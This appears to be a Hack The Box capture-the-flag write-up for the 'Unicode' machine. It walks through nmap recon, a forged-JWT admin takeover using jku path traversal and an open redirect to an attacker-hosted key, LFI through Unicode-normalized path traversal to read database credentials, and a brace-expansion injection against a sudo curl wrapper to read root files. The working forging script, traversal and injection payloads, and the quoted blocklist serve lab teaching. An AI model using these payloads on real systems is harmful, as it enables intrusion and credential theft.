<h2 id="1-mindset-and-approach-mindset">1. Mindset &amp; Approach {#mindset}</h2>
<p>Before touching a machine, the hacker mindset is:</p>
<blockquote>
<p><strong>"Every feature is an attack surface. Every input is a potential injection point. Every trust assumption is a potential bypass."</strong></p>
</blockquote>
<p>We approach this in layers:</p>
<ul>
<li><strong>What ports are open?</strong> → What services are running?</li>
<li><strong>What does the app do?</strong> → What does it trust? What does it validate?</li>
<li><strong>Where does it fail?</strong> → Can we abuse the gap between what it <em>checks</em> and what it <em>does</em>?</li>
</ul>
<hr />
<h2 id="2-reconnaissance-nmap-recon">2. Reconnaissance — Nmap {#recon}</h2>
<h3 id="what-we-ran">What we ran</h3>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.12.87
nmap -p 22,80 -sCV 10.129.12.87
</code></pre>
<h3 id="what-we-found">What we found</h3>
<pre><code>22/tcp  open  ssh     OpenSSH 8.2p1
80/tcp  open  http    nginx 1.18.0
</code></pre>
<h3 id="why-we-did-it-this-way">Why we did it this way</h3>
<ul>
<li><code>-p-</code> scans <strong>all 65535 ports</strong>, not just the top 1000. Services are often hidden on high ports.</li>
<li><code>--min-rate 10000</code> speeds up the scan significantly on HTB's stable network.</li>
<li><code>-sCV</code> on specific ports runs <strong>version detection</strong> (<code>-sV</code>) and <strong>default scripts</strong> (<code>-sC</code>) to grab banners, headers, and service details.</li>
</ul>
<h3 id="hacker-mindset">Hacker mindset</h3>
<p>Only two ports open means our entire attack surface is the web app on port 80. SSH is almost certainly the path in — but only after we find credentials or a key through the web app. We ignore SSH for now and focus everything on port 80.</p>
<hr />
<h2 id="3-web-enumeration-web">3. Web Enumeration {#web}</h2>
<h3 id="add-hostname-to-etc-hosts">Add hostname to /etc/hosts</h3>
<pre><code class="language-bash" data-language="bash">echo "10.129.12.87 hackmedia.htb" | sudo tee -a /etc/hosts
</code></pre>
<p><strong>Why:</strong> The nmap HTTP response referenced <code>hackmedia.htb</code>. Web apps often behave differently (or only work properly) when accessed by hostname rather than IP due to virtual hosting. Always add discovered hostnames to <code>/etc/hosts</code>.</p>
<h3 id="browse-the-site">Browse the site</h3>
<p>Visiting <code>http://hackmedia.htb</code> shows a "threat intelligence" company site. Key observations:</p>
<ul>
<li><code>/login/</code> and <code>/register/</code> pages exist</li>
<li>A link in the nav goes to <code>/redirect/?url=google.com</code> — <strong>this is an open redirect, file it away</strong></li>
<li>Footer says "Powered by Flask" — Python backend</li>
</ul>
<h3 id="register-an-account-and-log-in">Register an account and log in</h3>
<p>After registering and logging in, we get redirected to <code>/dashboard</code>. The interesting part is in the HTTP response headers — a cookie is REDACTED</p>
<pre><code>Set-Cookie: null encoded lab material]...
</code></pre>
<h3 id="decode-the-jwt">Decode the JWT</h3>
<p>A JWT (JSON Web Token) is three base64url-encoded parts separated by dots:</p>
<ul>
<li><strong>Header</strong> — algorithm and metadata</li>
<li><strong>Payload</strong> — claims (who you are)</li>
<li><strong>Signature</strong> — cryptographic proof the token is REDACTED</li>
</ul>
<p>Decoding the header reveals:</p>
<pre><code class="language-json" data-language="json">{
  "typ": "JWT",
  "alg": "RS256",
  "jku": "http://hackmedia.htb/static/jwks.json"
}
</code></pre>
<p>Decoding the payload reveals:</p>
<pre><code class="language-json" data-language="json">{
  "user": "testuser"
}
</code></pre>
<h3 id="why-this-matters">Why this matters</h3>
<ul>
<li><strong>RS256</strong> means the token is REDACTED with an RSA <em>private</em> key and verified with a <em>public</em> key. Unlike HS256 (symmetric/secret), the public key can be published — and here it is, at the <code>jku</code> URL.</li>
<li><strong><code>jku</code> (JWK Set URL)</strong> is a header telling the server <em>where to fetch the public key</em> to verify this token. This is the attack surface.</li>
</ul>
<h3 id="hacker-mindset-2">Hacker mindset</h3>
<blockquote>
<p>"The server fetches the public key from a URL. That URL is in the token itself, which <em>I</em> control. If I can make the server fetch a key <em>I</em> host, I can sign tokens with my own private key and impersonate anyone — including <code>admin</code>."</p>
</blockquote>
<p>The only obstacle: the server probably only trusts URLs on its own domain.</p>

<h2 id="4-jwt-forgery-rs256-jku-abuse-jwt">4. JWT Forgery (RS256 + JKU Abuse) {#jwt}</h2>
<h3 id="the-full-exploit-chain">The full exploit chain</h3>
<pre><code>Our Server (serves our jwks.json)
        ↑
        |  open redirect
hackmedia.htb/redirect/?url=10.10.16.84/jwks.json
        ↑
        |  path traversal in jku
hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json
</code></pre>
<h3 id="step-1-generate-our-own-rsa-key-pair">Step 1 — Generate our own RSA key pair</h3>
<pre><code class="language-bash" data-language="bash">cd /tmp
openssl genrsa -out jwtRSA256-private.pem 2048
openssl rsa -in jwtRSA256-private.pem -pubout -outform PEM -out jwtRSA256-public.pem
</code></pre>
<p><strong>Why:</strong> We need our own RSA private key to sign the forged token. We'll publish the matching public key on our HTTP server so the target can "verify" it — but it's our key, so we control what gets verified.</p>
<h3 id="step-2-build-jwks-json-and-forge-the-jwt">Step 2 — Build jwks.json and forge the JWT</h3>
<pre><code class="language-python" data-language="python">python3 -c "
import json, base64
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

with open('/tmp/jwtRSA256-private.pem', 'rb') as f:
    priv = serialization.load_pem_private_key(f.read(), password=REDACTED, backend=default_backend())

nums = priv.public_key().public_numbers()
n = base64.urlsafe_b64encode(nums.n.to_bytes((nums.n.bit_length()+7)//8,'big')).rstrip(b'=').decode()
e = base64.urlsafe_b64encode(nums.e.to_bytes((nums.e.bit_length()+7)//8,'big')).rstrip(b'=').decode()

jwks = {'keys':[{'kty':'RSA','use':'sig','kid':'hackthebox','alg':'RS256','n':n,'e':e}]}
with open('/tmp/jwks.json','w') as f:
    json.dump(jwks, f, indent=4)

def b64u(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {'typ':'JWT','alg':'RS256','jku':'http://hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json'}
payload = {'user':'admin'}
h = b64u(json.dumps(header,separators=(',',':')))
p = b64u(json.dumps(payload,separators=(',',':')))
sig = base64.urlsafe_b64encode(priv.sign(f'{h}.{p}'.encode(), padding.PKCS1v15(), hashes.SHA256())).rstrip(b'=').decode()
print(f'{h}.{p}.{sig}')
"
</code></pre>
<p><strong>Breaking down the <code>jku</code> value:</strong></p>
<pre><code>http://hackmedia.htb/static/../redirect/?url=10.10.16.84/jwks.json
</code></pre>
<ul>
<li>The server checks that <code>jku</code> starts with <code>http://hackmedia.htb/static/</code> —  it does</li>
<li>But <code>/static/../</code> resolves to just <code>/</code> via path traversal</li>
<li>So the real URL hit is <code>http://hackmedia.htb/redirect/?url=10.10.16.84/jwks.json</code></li>
<li>That open redirect we noted earlier sends the server to <em>our</em> machine</li>
<li>We serve our <code>jwks.json</code> with our public key</li>
</ul>
<h3 id="step-3-serve-the-key-and-set-the-cookie">Step 3 — Serve the key and set the cookie</h3>
<pre><code class="language-bash" data-language="bash">cd /tmp &amp;&amp; python3 -m http.server 80
</code></pre>
<p>Replace the <code>auth</code> cookie in the browser with the forged JWT. When the server validates the token, it:</p>
<ol>
<li>Reads <code>jku</code> from the header → follows the redirect → hits our server → gets our <code>jwks.json</code></li>
<li>Uses our public key to verify the signature — which validates perfectly because we signed it with the matching private key</li>
<li>Reads <code>"user": "admin"</code> from the payload and grants admin access</li>
</ol>
<p><strong>Confirmed:</strong> The HTTP server logs <code>GET /jwks.json HTTP/1.1" 200</code> — the server trusted our key.</p>
<h3 id="what-we-now-have">What we now have</h3>
<p>Admin dashboard access, with new links pointing to <code>/display/?page=monthly.pdf</code>.</p>

<h2 id="5-local-file-inclusion-via-unicode-normalization-lfi">5. Local File Inclusion via Unicode Normalization {#lfi}</h2>
<h3 id="the-vulnerability">The vulnerability</h3>
<p>The <code>/display/?page=</code> endpoint loads files from the filesystem based on user input. Trying <code>?page=/etc/passwd</code> returns a filtering error:</p>
<blockquote>
<p>"we do a lot input filtering you can never bypass our filters"</p>
</blockquote>
<p>Testing reveals the blocklist includes:</p>
<ul>
<li><code>../</code> (path traversal)</li>
<li><code>/etc</code>, <code>/var</code>, <code>/home</code> (key directories)</li>
</ul>
<h3 id="the-bypass-unicode-normalization">The bypass — Unicode Normalization</h3>
<p>The box is named "Unicode" for a reason. Many web frameworks normalize unicode characters — converting lookalike unicode characters to their ASCII equivalents — <em>after</em> the WAF/filter has already run.</p>
<p>The character <code>‥</code> (U+2025, TWO DOT LEADER, encoded as <code>%E2%80%A5</code>) looks like two dots but is a single unicode character. After normalization, it becomes <code>..</code>.</p>
<p>So:</p>
<pre><code>%E2%80%A5/  →  (after normalization) →  ../
</code></pre>
<p>The filter sees <code>%E2%80%A5/</code> and passes it. The filesystem sees <code>../</code> and traverses up.</p>
<h3 id="reading-db-yaml">Reading db.yaml</h3>
<pre><code class="language-bash" data-language="bash">curl -s 'http://hackmedia.htb/display/?page=%E2%80%A5/%E2%80%A5/%E2%80%A5/%E2%80%A5/home/code/coder/db.yaml' \
  --cookie 'auth=REDACTED
</code></pre>
<p><strong>Why that path?</strong> We know from the nginx config (also readable via LFI at <code>/etc/nginx/sites-available/default</code>) that the app lives in <code>/home/code/coder/</code>. Four <code>%E2%80%A5/</code> sequences traverse up four directory levels from wherever the app is serving files.</p>
<p><strong>Result:</strong></p>
<pre><code class="language-yaml" data-language="yaml">mysql_host: "localhost"
mysql_user: "code"
mysql_password: "REDACTED"
mysql_db: "user"
</code></pre>
<h3 id="hacker-mindset-3">Hacker mindset</h3>
<blockquote>
<p>"The filter only catches what it knows to look for. If I can represent the same path in a way the filter doesn't recognize, but the app/OS does, I win. Unicode normalization is exactly that gap."</p>
</blockquote>

<h2 id="7-privilege-escalation-via-sudo-treport-privesc">7. Privilege Escalation via <code>sudo treport</code> {#privesc}</h2>
<h3 id="enumeration">Enumeration</h3>
<p>First thing on any new shell: check what we can run as root.</p>
<pre><code class="language-bash" data-language="bash">sudo -l
</code></pre>
<p>Output:</p>
<pre><code>(root) NOPASSWD: /usr/bin/treport
</code></pre>
<p>We can run <code>/usr/bin/treport</code> as root with no password. This is our escalation path.</p>
<h3 id="analyzing-treport">Analyzing treport</h3>
<p>Running the binary shows a menu:</p>
<pre><code>1. Create Threat Report
2. Read Threat Report
3. Download A Threat Report
4. Quit
</code></pre>
<p>The binary is actually a Python script packaged with PyInstaller into an ELF. The key code in option 3 is:</p>
<pre><code class="language-python" data-language="python">def download(self):
    command_injection_list = ['$','`',';','&amp;','|','||','&gt;','&lt;','?',"'",'@','#','$','%','^','(',')']
    ip = input('Enter the IP/file_name:')
    
    # Filter 1: no whitespace
    if bool(re.search('\\s', ip)):
        sys.exit(0)
    
    # Filter 2: block certain URL schemes
    if 'file' in ip or 'gopher' in ip or 'mysql' in ip:
        sys.exit(0)
    
    # Filter 3: block special chars (but NOT curly braces!)
    for vars in command_injection_list:
        if vars in ip:
            sys.exit(0)
    
    cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
    os.system(cmd)
</code></pre>
<h3 id="the-vulnerabilities">The vulnerabilities</h3>
<p><strong>Vulnerability 1 — Case-sensitive filter:</strong>
The check is <code>if 'file' in ip</code> — lowercase only. <code>File:///root/root.txt</code> passes the filter but curl treats it identically to <code>file:///root/root.txt</code>.</p>
<p><strong>Vulnerability 2 — Bash brace expansion:</strong>
Curly braces <code>{}</code> are not in the blocklist. Bash expands <code>{a,b,c}</code> into separate arguments <code>a b c</code>. So:</p>
<pre><code class="language-bash" data-language="bash">curl {File:///root/root.txt,-o-} -o /root/reports/threat_report_XX_XX_XX
</code></pre>
<p>becomes:</p>
<pre><code class="language-bash" data-language="bash">curl File:///root/root.txt -o- -o /root/reports/threat_report_XX_XX_XX
</code></pre>
<p>The <code>-o-</code> flag tells curl to output to stdout instead of a file, so the content is printed directly to the terminal.</p>
<p><strong>Vulnerability 3 — No whitespace needed:</strong>
The filter blocks whitespace, but brace expansion naturally separates the arguments without spaces.</p>
<h3 id="the-exploit">The exploit</h3>
<pre><code class="language-bash" data-language="bash">sudo /usr/bin/treport
</code></pre>
<pre><code>Enter your choice: 3
Enter the IP/file_name: {File:///root/root.txt,-o-}
</code></pre>

<h3 id="the-hacker-mindset-in-one-sentence-per-step">The hacker mindset in one sentence per step:</h3>
<ol>
